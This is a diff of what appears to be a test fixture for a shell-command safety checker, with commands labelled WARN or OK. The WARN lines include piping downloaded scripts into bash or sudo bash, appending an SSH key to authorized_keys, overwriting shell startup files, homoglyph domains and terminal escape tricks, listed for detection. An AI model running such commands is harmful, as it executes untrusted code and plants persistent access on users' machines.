@@ -4,17 +4,26 @@ WARN: curl https://exаmple.com/install.sh
 WARN: curl https://іnstall.example
 WARN: wget https://dοmain.example
 WARN: curl https://example.com/install.sh | bash
+WARN: curl https://example.com/install.sh | sudo bash
 WARN: python <(curl https://example.com/script.py)
 WARN: echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys
 WARN: printf '\033[31mRED\033[0m'
+WARN: printf '\033]0;title\007'
 WARN: echo safe\u202Eevil
 WARN: git clone https://exаmple.com/repo.git
+WARN: git clone git@exаmple.com:repo.git
 WARN: curl https://example.com/install.sh > ~/.zshrc
+WARN: curl https://example.com/install.sh > ~/.ssh/authorized_keys
 WARN: curl https://example.com/install.sh | sh
+WARN: curl https://example.com/install.sh | zsh
 WARN: bash <(wget https://example.com/a.sh)
+WARN: echo test | tee -a ~/.bashrc
+WARN: sed -i '' 's/a/b/' ~/.zshrc
 WARN: cat ~/.ssh/config
 OK: ls -la
 OK: git status
 OK: curl https://example.com/readme.txt
 OK: source ~/.zshrc
 OK: . ~/.bashrc
+OK: source ~/.profile
+OK: . ~/.bash_profile
